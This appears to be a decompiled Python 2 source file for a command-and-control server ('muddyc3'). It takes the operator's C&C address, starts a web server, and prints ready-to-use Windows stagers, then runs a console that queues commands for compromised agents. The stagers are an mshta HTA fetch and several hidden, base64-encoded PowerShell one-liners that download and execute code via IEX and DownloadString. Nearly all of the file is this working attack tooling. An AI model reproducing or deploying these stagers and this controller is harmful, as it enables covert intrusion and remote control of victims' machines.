# Embedded file name: muddyc3.py
from core import webserver
from core import header
from core.cmd import cmd
from core import config
from core.color import bcolors
import urllib2
import threading

def main():
    header.Banner()
    CC = []
    while len(CC) == 0:
        CC = raw_input('Enter a ip:port for C&C: ip:port: ')

    proxy = raw_input('Enter PROXY:')
    if proxy:
        ip = proxy
    CC = CC.split(':')
    config.set_port(CC[1])
    config.set_ip(CC[0])
    server = threading.Thread(target=webserver.main, args=())
    server.start()
    print '+' + '-' * 60 + '+'
    cmd().help()
    print '+' + '-' * 60 + '+'
    print bcolors.OKBLUE + '(LOW):' + bcolors.ENDC
    print 'mshta http://%s:%s/hta' % (config.IP, config.PORT)
    config.PAYLOADS.append('\nmshta http://%s:%s/hta' % (config.IP, config.PORT))
    print ''
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}/get');IEX($s)"
    payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
    payload = payload.encode('base64').replace('\n', '')
    print bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC
    print '---+Powershell JOB Payload+---\n' + commandJ.replace('{payload}', payload)
    print ''
    print '---+Powershell New Process Payload+---\n' + commandP.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandJ.replace('{payload}', payload))
    config.PAYLOADS.append(commandP.replace('{payload}', payload))
    print bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}/hjf');IEX($s)"
    payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File Payload+---'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://{ip}:{port}/hjfs');IEX($s)"
    payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
    payload = payload.encode('base64').replace('\n', '')
    print '---+Powershell JOB + File +SCT Payload+---'
    print commandF.replace('{payload}', payload)
    print ''
    config.PAYLOADS.append(commandF.replace('{payload}', payload))
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/get');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/get');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/get');\""""
    payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
    payload2 = payload2.replace('{ip}', config.IP).replace('{port}', config.PORT)
    payload3 = payload3.replace('{ip}', config.IP).replace('{port}', config.PORT)
    print '---+ Powershell simple payloads +---'
    print payload
    print payload2
    print payload3
    print ''
    config.PAYLOADS.append(payload)
    config.PAYLOADS.append(payload2)
    config.PAYLOADS.append(payload3)
    print '+' + '-' * 60 + '+'
    while True:
        if config.POINTER == 'main':
            command = raw_input('(%s : %s) ' % (config.BASE, config.POINTER))
        else:
            command = raw_input('(%s : Agent(%s)-%s) ' % (config.BASE, str(config.AGENTS[config.POINTER][0]), config.AGENTS[config.POINTER][1]))
        bcommand = command.strip().split()
        if bcommand:
            if bcommand[0] in cmd.COMMANDS:
                result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
            elif bcommand[0] not in cmd.COMMANDS and config.POINTER != 'main':
                config.COMMAND[config.POINTER].append(command.strip())


if __name__ == '__main__':
    main()
